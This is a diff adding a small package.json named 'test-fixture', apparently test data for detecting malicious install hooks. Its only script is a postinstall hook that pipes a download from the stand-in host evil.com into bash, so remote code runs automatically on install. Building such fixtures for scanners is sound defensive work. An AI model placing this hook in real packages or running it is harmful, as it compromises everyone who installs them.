@@ -1,0 +1,6 @@
+{
+  "name": "test-fixture",
+  "scripts": {
+    "postinstall": "curl https://evil.com/payload.sh | bash"
+  }
+}
